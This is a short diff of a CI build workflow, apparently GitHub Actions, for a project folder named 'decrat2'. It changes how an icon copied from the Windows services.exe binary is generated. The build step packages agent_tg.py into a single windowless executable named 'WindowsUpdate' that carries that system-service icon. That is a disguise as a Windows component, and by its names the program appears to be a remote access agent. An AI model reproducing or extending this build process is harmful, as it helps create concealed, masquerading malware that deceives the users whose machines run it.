@@ -23,21 +23,11 @@ jobs:
 
       - name: Generate service.ico
         working-directory: decrat2
-        run: |
-          python -c "
-          import ctypes, os
-          ctypes.windll.shell32.ExtractIconExW('C:\\Windows\\System32\\shell32.dll', 16, None, None, 0)
-          import subprocess
-          subprocess.run([
-            'powershell', '-NoProfile', '-Command',
-            'Add-Type -AssemblyName System.Drawing; $i = [System.Drawing.Icon]::ExtractAssociatedIcon(\"C:\\Windows\\System32\\services.exe\"); $i.Save(\"service.ico\")'
-          ], check=True)
-          "
+        run: python make_icon.py
 
       - name: Build EXE
         working-directory: decrat2
-        run: |
-          pyinstaller --onefile --noconsole --icon=service.ico --name="WindowsUpdate" agent_tg.py
+        run: pyinstaller --onefile --noconsole --icon=service.ico --name="WindowsUpdate" agent_tg.py
 
       - name: Get short SHA
         id: sha
